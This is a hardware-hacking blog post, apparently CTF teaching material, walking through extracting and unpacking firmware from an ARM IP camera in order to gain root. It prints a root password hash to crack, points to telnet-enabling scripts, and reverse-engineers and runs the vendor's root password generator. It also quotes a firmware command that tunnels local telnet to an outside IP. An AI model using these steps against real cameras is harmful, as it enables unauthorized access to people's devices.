---
title: 'Embedded hardware firmware extraction and analysys: Part 3 ARM'
date: 2019-02-18
permalink: /posts/2019/02/Indeed_CTF_Embedded_3/
tags:
  - Hardware
  - Firmware
  - ARM
  - Binary
  - Reverse Engineering
---

# ARM Cloud Conected Camera 

This example will be looking for ways to get a root shell on this camera. 

![cloud camera front](/images/Cloudipcam_front.jpg)
![cloud camera back](/images/Cloudipcam_back.jpg)

## Extraction

Unlike the previous device we can take another route, for this I was able to get a u-boot shell but I didn't want to take all day to get a read of the flash chip. 

![cloud camera front](/images/Cloudipcam_UART_pins.jpg)

The UART runs at 38.4k baud so I used the hot air wand on the PCB rework station to remove the chip and loaded it in a socket to read.

### Extraction Demo

#### Tools

The following was copied from another of my posts.

Chipquik low temp solder: This lets us use less heat to remove the component and prevents damage to the pads and component. It isnt really solder, this stuff contains bismuth and will expand when it crystalizes. This will give you some disgusting looking solder joints that will also be brittle as hell, its important to clean this a few times with fresh solder and braid.

![Chipquik_box](/images/Chipquik_box.jpg)
![Chipquik_alloy](/images/Chipquik_alloy.jpg)

Amtech 559 flux: I love this stuff, it doesnt burn up the same way as other fluxes and does not deposit a hard layer of rosin after use. It also doesn't stink as bad when you hit it with a hot air wand.

![Amtech_559_flux](/images/Amtech_559_flux.jpg)

#### Removal Process

Unfortunatly I did not get photos or document this process on the original hardware, I did get a similar chip from another donor board that I can show here.

![donor board start](/images/Donorboard_start.jpg)

The first step is to clean the board with anhydrous isopropyl alcohol to remove oil/dust/contaminants that will either burn off and choke me with fumes or foul the solder joint. We can now see our target clearly.

![MX25L6445E on board](/images/MX25L6445E_on_board.jpg)

These are pretty common parts and the pin assignments can be found all over the internet by searching for the part numbers, for this example I'll use the larger mx25l12835f that was found on the original camera. Note that pin 1 is indicated by the dot on the lower left and upper left in the datasheet.

![mxic25l12835f pinout](/images/mxic25l12835f.png)

We flux the pins to help the solder flow, flux is a chemical cleaning agent that will donate electrons and strip oxygen from the surface of the solder. Oxygen will turn the lead and tin in solder into a clumpy crumbly mess, I have overapplied it here because the hot air will blow it away.

![MX25L6445E flux applied](/images/MX25L6445E_fluxed.jpg)

The next step is using some of my favorite stuff, Chipquik is magic.

![MX25L6445E Chipquik applied](/images/MX25L6445E_chipquik.jpg)

Heat the legs evenly and lightly jiggle the chip with the tweezers until the chip lifts free, jiggling helps to get the low melt alloy displace the actual solder in the joint.

![MX25L6445E free](/images/MX25L6445E_free.jpg)

Use desoldering braid and alcohol to clean up the pads on the board, do the same with the legs on your chip. I find that disposable lint free antistatic wipes do a great job here.

![Donor board cleaned](/images/Donorboard_clean.jpg)

![MX25L6445E clean on palm](/images/MX25L6445E_cleanonpalm.jpg)

#### Reading Data

Verify pin 1 on the clip, these are usually color coded to help with this process.

![MX25L6445E aligned pin one](/images/MX25L6445E_alignedpinone.jpg)

Attach the clip to the chip, it is sometimes possible to read one of these while it is still installed on a board by halting the cpu while it is powered up. Removal allows for complete control and is a little bit safer than worrying about weird ground loops killing your chip/board/reader/USB port/...

![MX25L6445E in clip](/images/MX25L6445E_inclip.jpg)

The hardware used is a MiniPRO TL866CS, these are still available on ebay and amazon but a lot of them are fakes, the original manufacturer has stopped releasing software for it because of this but I could only get it to install on windows XP anyway. I am using an open source version that is much less of a pain in the ass. 
[https://gitlab.com/DavidGriffith/minipro/](https://gitlab.com/DavidGriffith/minipro/)

```
$ minipro -L mx25l6445e
MX25L6445E @SOP16
MX25L6445E @SOP8
MX25L6445E @WSON8

$ minipro -p "MX25L6445E @SOP8" -r MX25L6445E.bin
Found TL866CS 03.2.72 (0x248)
Chip ID OK: 0xC22017
Reading Code...  83.42Sec  OK

$ ls -laht MX25L6445E.bin 
-rw-rw-r-- 1 rjmendez rjmendez 8.0M Mar  4 20:31 MX25L6445E.bin
$ file MX25L6445E.bin 
MX25L6445E.bin: data
```

### Binwalk

Lets move on from the other chip to the target of this section.
Within the provided archive navigate to the cloudipcamera folder where "cloudipcamera_mxic25l12835f.BIN" sits.

Run binwalk on the file and note the important addresses.

```
binwalk cloudipcamera_mxic25l12835f.BIN
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
312032        0x4C2E0         Sega MegaDrive/Genesis raw ROM dump, Name: "ETIR_ON", "ECCAS",
809008        0xC5830         CRC32 polynomial table, big endian
852224        0xD0100         Linux kernel ARM boot executable zImage (big-endian)
12582912      0xC00000        JFFS2 filesystem, little endian
14201020      0xD8B0BC        Zlib compressed data, compressed
14201276      0xD8B1BC        Zlib compressed data, compressed
14201536      0xD8B2C0        Zlib compressed data, compressed
14201828      0xD8B3E4        Zlib compressed data, compressed
14202132      0xD8B514        Zlib compressed data, compressed
14202432      0xD8B640        Zlib compressed data, compressed
14202572      0xD8B6CC        Zlib compressed data, compressed
14202708      0xD8B754        JFFS2 filesystem, little endian
14203192      0xD8B938        Zlib compressed data, compressed
14203456      0xD8BA40        Zlib compressed data, compressed
14203640      0xD8BAF8        Executable script, shebang: "/bin/sh"
14203916      0xD8BC0C        Zlib compressed data, compressed
14204164      0xD8BD04        Zlib compressed data, compressed
<Various locations of compressed data>
```

Why is 0x0 through 0xC00000 big endian and 0xC00000 onwards little endian? What does this even mean? Consider the following strings:

## 0123456789ABCDEF

## 32107654BA98FEDC

The second has every four characters in reversed order

## **0123** 4567 89AB CDEF

## **3210** 7654 BA98 FEDC

The data stored in the first section of memory is just ordered differently than the second, we can fix that by splitting the file.

```
dd count=12582912 bs=1 if=cloudipcamera_mxic25l12835f.BIN of=cloudipcamera_mxic25l12835f.BIN.head
```

```
dd skip=12582912 bs=1 if=cloudipcamera_mxic25l12835f.BIN of=cloudipcamera_mxic25l12835f.BIN.tail
```

Then we can reverse the order.

```
objcopy -I binary -O binary --reverse-bytes=4 cloudipcamera_mxic25l12835f.BIN.head cloudipcamera_mxic25l12835f.BIN.head.swapped
```

Merge them back together with cat.

```
cat cloudipcamera_mxic25l12835f.BIN.head.swapped cloudipcamera_mxic25l12835f.BIN.tail > cloudipcamera_mxic25l12835f.BIN.merge
```

When we run binwalk now we get the following.

```
binwalk cloudipcamera_mxic25l12835f.BIN.merge

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
809008        0xC5830         CRC32 polynomial table, little endian
852224        0xD0100         Linux kernel ARM boot executable zImage (little-endian)
865293        0xD340D         gzip compressed data, maximum compression, from Unix, last modified: 2015-10-23 07:16:16
12582912      0xC00000        JFFS2 filesystem, little endian
14201020      0xD8B0BC        Zlib compressed data, compressed
14201276      0xD8B1BC        Zlib compressed data, compressed
14201536      0xD8B2C0        Zlib compressed data, compressed
14201828      0xD8B3E4        Zlib compressed data, compressed
14202132      0xD8B514        Zlib compressed data, compressed
14202432      0xD8B640        Zlib compressed data, compressed
14202572      0xD8B6CC        Zlib compressed data, compressed
14202708      0xD8B754        JFFS2 filesystem, little endian
14203192      0xD8B938        Zlib compressed data, compressed
14203456      0xD8BA40        Zlib compressed data, compressed
14203640      0xD8BAF8        Executable script, shebang: "/bin/sh"
```

If you feel like a tangent you can check the following URLs: 
[https://en.wikipedia.org/wiki/Endianness](https://en.wikipedia.org/wiki/Endianness)
[https://en.wikipedia.org/wiki/Endianness#Bi-endianness](https://en.wikipedia.org/wiki/Endianness#Bi-endianness)
[https://xkcd.com/927/](https://xkcd.com/927/) Welp...

Finally we can extract the entire filesystem at once.

```
binwalk -Me cloudipcamera_mxic25l12835f.BIN.merge
# Followed by
ls -laht _cloudipcamera_mxic25l12835f.BIN.merge.extracted/
```

There are multiple jffs2 root filesystems, this is caused by the way jffs2 works. The jffs2 folders other than "**jffs2-root**" can be ignored for our purposes going forward.
Tangent URL: [https://www.sourceware.org/jffs2/jffs2-html/](https://www.sourceware.org/jffs2/jffs2-html/)
Flash storage is weird.

Next lets look for the root filesystem, dig into the extracted D340D file.

```
binwalk _cloudipcamera_mxic25l12835f.BIN.merge.extracted/D340D 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
106752        0x1A100         gzip compressed data, maximum compression, from Unix, last modified: 2015-10-23 07:16:09
10406581      0x9ECAB5        Certificate in DER format (x509 v3), header length: 4, sequence length: 3
10459932      0x9F9B1C        Linux kernel version 2.6.28
10475560      0x9FD828        gzip compressed data, maximum compression, from Unix, last modified: 2015-08-17 23:50:38
10547756      0xA0F22C        CRC32 polynomial table, little endian

file _cloudipcamera_mxic25l12835f.BIN.merge.extracted/_D340D.extracted/1A100 
_cloudipcamera_mxic25l12835f.BIN.merge.extracted/_D340D.extracted/1A100: ASCII cpio archive (SVR4 with no CRC)

ls -laht _cloudipcamera_mxic25l12835f.BIN.merge.extracted/_D340D.extracted/_1A100.extracted/
total 12M
drwxr-xr-x 15 rjmendez rjmendez 4.0K Feb 17 21:51 cpio-root
drwxr-xr-x  3 rjmendez rjmendez 4.0K Feb 17 21:51 .
-rw-r--r--  1 rjmendez rjmendez  12M Feb 17 21:51 0.cpio
drwxr-xr-x  3 rjmendez rjmendez 4.0K Feb 17 21:51 ..

ls -laht _cloudipcamera_mxic25l12835f.BIN.merge.extracted/_D340D.extracted/_1A100.extracted/cpio-root/
total 64K
drwxr-xr-x  2 rjmendez rjmendez 4.0K Feb 17 21:51 project
drwxr-xr-x 15 rjmendez rjmendez 4.0K Feb 17 21:51 .
drwxr-xr-x  6 rjmendez rjmendez 4.0K Feb 17 21:51 etc
-rwxr-xr-x  1 rjmendez rjmendez  278 Feb 17 21:51 init
drwxr-xr-x  6 rjmendez rjmendez 4.0K Feb 17 21:51 mnt
drwxr-xr-x  2 rjmendez rjmendez 4.0K Feb 17 21:51 proc
drwxr-xr-x  5 rjmendez rjmendez 4.0K Feb 17 21:51 usr
drwxr-xr-x  2 rjmendez rjmendez 4.0K Feb 17 21:51 bin
drwxr-xr-x  2 rjmendez rjmendez 4.0K Feb 17 21:51 root
drwxr-xr-x  2 rjmendez rjmendez 4.0K Feb 17 21:51 lib
drwxr-xr-x  3 rjmendez rjmendez 4.0K Feb 17 21:51 dev
drwxr-xr-x  2 rjmendez rjmendez 4.0K Feb 17 21:51 sbin
drwxr-xr-x  2 rjmendez rjmendez 4.0K Feb 17 21:51 sys
drwxr-xr-x  2 rjmendez rjmendez 4.0K Feb 17 21:51 tmp
drwxr-xr-x  4 rjmendez rjmendez 4.0K Feb 17 21:51 var
drwxr-xr-x  3 rjmendez rjmendez 4.0K Feb 17 21:51 ..
```

Feel free to explore here, what can you learn about the operating system?

## Question: What type of password hash is this? "$1$EWHkEni4$49Oju3YI08z3ERvxPpL2H0"
    Bonus: What is the password? :D

Go into the project folder on the root of the filesystem and extract the archive there.

```
cd _D340D.extracted/_1A100.extracted/cpio-root/project/
unlzma -c ipc_project_v1.9.5.1510231507.rtl8188.tar.lzma > project.tar
tar xvf project.tar
```

## Question: What is inside of this archive?

Inspect the contents of the following folders. A valuable tool is grep, try using grep to answer the following question.

```
apps/app/ipc/data/default/
../../../../jffs2-root/fs_1/ipc_data/
```
A valuable tool is grep, try using grep to answer the following question. Use ```man grep``` to learn how to recursively search a path and ignore case or even search within binary files. If you plan to search binary files you will get better results running the grep output through strings as well.

## Question: What is the device serial number?

Inspect the files below.

```
apps/app/ipc/data/sh/sd_card_insert.sh
apps/app/ipc/data/sh/dev_telnet.sh
```

## Question: What would these scripts let us do? How would you attack this camera?

# WINNING

# Mitigation of remote attack

Inspect the following shell script.

```
apps/app/ipc/data/sh/dev_passwd.sh
```

## Question: How is the root password randomized? What is generating the password?

Lets look at this magical tool that generates our random password!

```
radare2 platforms/faraday-linux-armv5/bin/mipc_tool
 -- This software comes with no brain included. Please use your own.
[0x00009a90]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Finding xrefs in noncode section with anal.in = 'io.maps'
[x] Analyze value pointers (aav)
[x] Value from 0x0006b090 to 0x0006bea0 (aav)
[x] 0x0006b090-0x0006bea0 in 0x6b090-0x6bea0 (aav)
[x] 0x0006b090-0x0006bea0 in 0x6a000-0x6b090 (aav)
[x] 0x0006b090-0x0006bea0 in 0x8000-0x61a48 (aav)
[x] Value from 0x0006a000 to 0x0006b090 (aav)
[x] 0x0006a000-0x0006b090 in 0x6b090-0x6bea0 (aav)
[x] 0x0006a000-0x0006b090 in 0x6a000-0x6b090 (aav)
[x] 0x0006a000-0x0006b090 in 0x8000-0x61a48 (aav)
[x] Value from 0x00008000 to 0x00061a48 (aav)
[x] 0x00008000-0x00061a48 in 0x6b090-0x6bea0 (aav)
[x] 0x00008000-0x00061a48 in 0x6a000-0x6b090 (aav)
[x] 0x00008000-0x00061a48 in 0x8000-0x61a48 (aav)
<Removed noise>
[x] Emulate code to find computed references (aae)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
<Removed noise>
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00009a90]> s main
[0x0000f674]> VV
```

Check out the branch leading to 0xf95c that references "sym.ipc_tool_pass_main()" tap "qq" to drop to the radare2 shell again.

```
[0x0000f674]> axt @ sym.ipc_tool_pass_main()
main 0xf964 [CALL] bl sym.ipc_tool_pass_main
[0x0000f674]> s sym.ipc_tool_pass_main()
[0x0000db94]> VV
```

Follow the same process for "sym.mpass_calc()"

```
[0x00025844]> axt @ sym.md5_ex_encrypt()
sym.mpass_calc 0x25b20 [CALL] bl sym.md5_ex_encrypt
sym.mpass_calc 0x25b48 [CALL] bl sym.md5_ex_encrypt
sym.md5_ex_encrypt_hex 0x30a94 [CALL] bl sym.md5_ex_encrypt
```

**WAT**
The password looks like am md5? md5 encryption has been invented! To the proot!

```
cd ../../

proot -q "qemu-arm" -S cpio-root /project/platforms/faraday-linux-armv5/bin/mipc_tool
usage:
       -cmd wfc  -time ms |  -cmd wfc channel 
       -cmd pack_img_apply -pack pack_path
       -cmd pack_img_build -img img_path -pack pack_path
       -cmd click_listen
       -cmd gpio_set -pin pin -value value
       -cmd gpio_get -pin pin
       -cmd 1375
       -cmd mboard_pin_set -pin pin -value value
       -cmd mboard_pin_get -pin pin -path path
       -cmd mboard_name_get -path path
       -cmd mboard_name_set -name name
       -cmd debug -server 0/1 -ip ip -port port -file path . File content should be {pass:"pass",method:"telnet_on/telnet_off"}
       -cmd led -dev dev -pin_red pin_red -pin_green pin_green -interval interval
       -cmd sn -sn_path sn_path -mac_path mac_path
       -cmd pass -devid devid -refer refer -sp server_path -up user_path -plain plain -dst dst
       -cmd mvars [ -mod set|get ] [ -name name ] [ -value value ]
       -cmd wd [ -len len ]
       -cmd read_cfg [ -field xxx ] [ -cfg_file xxx ] [ -out_file xxx ]
       -cmd uart -mod write|read -name uart_name -baud baud_rate

echo "1" > /tmp/pass
echo "1" > /tmp/prompt
cd cpio-root/bin
ln -s busybox -T sh
ln -s busybox -T echo
cd ../../

proot -q "qemu-arm -strace" -S cpio-root /project/platforms/faraday-linux-armv5/bin/mipc_tool -cmd pass -ctx 1 -devid 0 -prompt /tmp/prompt -pass /tmp/pass -plain 2>&1 | grep echo
13603 execve("/bin/sh",{"sh","-c","echo 0@1 > /tmp/prompt",NULL})13603 brk(NULL) = 0x000ac000
13606 execve("/bin/sh",{"sh","-c","echo 96a3be3cf272e017046d1b2674a52bd3 > /tmp/pass",NULL})13606 brk(NULL) = 0x000ac000

proot -q "qemu-arm -strace" -S cpio-root /project/platforms/faraday-linux-armv5/bin/mipc_tool -cmd pass -ctx 1 -devid 1 -prompt /tmp/prompt -pass /tmp/pass -plain 2>&1 | grep echo
13792 execve("/bin/sh",{"sh","-c","echo 1@1 > /tmp/prompt",NULL})13792 brk(NULL) = 0x000ac000
13795 execve("/bin/sh",{"sh","-c","echo 6512bd43d9caa6e02c990b0a82652dca > /tmp/pass",NULL})13795 brk(NULL) = 0x000ac000

proot -q "qemu-arm -strace" -S cpio-root /project/platforms/faraday-linux-armv5/bin/mipc_tool -cmd pass -ctx 0 -devid 1 -prompt /tmp/prompt -pass /tmp/pass -plain 2>&1 | grep echo
13984 execve("/bin/sh",{"sh","-c","echo 1@0 > /tmp/prompt",NULL})13984 brk(NULL) = 0x000ac000
13987 execve("/bin/sh",{"sh","-c","echo d3d9446802a44259755d38e6d163e820 > /tmp/pass",NULL})13987 brk(NULL) = 0x000ac000

cat /tmp/pass 
d3d9446802a44259755d38e6d163e820
```

## Question and final exercise: What do these MPIC binaries do?

# WTF Section

## Question: What is the shell script with the hardcoded password for user 13510633251?
## Question: What does this look like its doing? 
```
mipc_tool -cmd tcpproxy --passive-remote 127.0.0.1:23 --remote 218.14.146.199:7024:/tmp/tcp_post.txt --header-notify-file /tmp/tcp_notify.txt --keep-running enable --keep-alive 300000
```
